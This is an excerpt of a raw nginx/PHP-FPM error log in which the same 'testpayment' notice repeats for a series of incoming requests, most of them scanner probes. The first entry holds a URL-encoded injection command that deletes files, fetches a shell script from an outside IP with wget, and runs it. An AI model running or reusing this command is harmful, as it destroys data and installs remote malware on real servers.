2024/02/12 09:39:48 [error] 550#0: *19133 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 185.224.128.10, server: example.com, request: "GET /cgi-bin/popen.cgi?command=rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Fbruh.sh%3B%20chmod%20777%20bruh.sh%3B%20.%2Fbruh.sh HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:43 [error] 550#0: *19138 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET / HTTP/1.0", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:"
2024/02/12 09:40:43 [error] 550#0: *19144 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /mcCI HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:43 [error] 550#0: *19141 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /nmaplowercheck1707748739 HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:43 [error] 550#0: *19142 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:44 [error] 550#0: *19149 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /pools/default/buckets HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:44 [error] 548#0: *19165 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /docs/cplugError.html/ HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:44 [error] 548#0: *19169 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /rest/applinks/1.0/manifest HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:45 [error] 548#0: *19174 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET /confluence/rest/applinks/1.0/manifest HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:45 [error] 548#0: *19176 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
2024/02/12 09:40:46 [error] 548#0: *19187 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: testpayment in /var/www/public_html/frontend/web/index.php on line 67" while reading response header from upstream, client: 192.168.139.171, server: example.com, request: "POST /scripts/WPnBr.dll HTTP/1.1", upstream: "fastcgi://unix:/var/run/php7.4-fpm.sock:", host: "10.10.1.5"
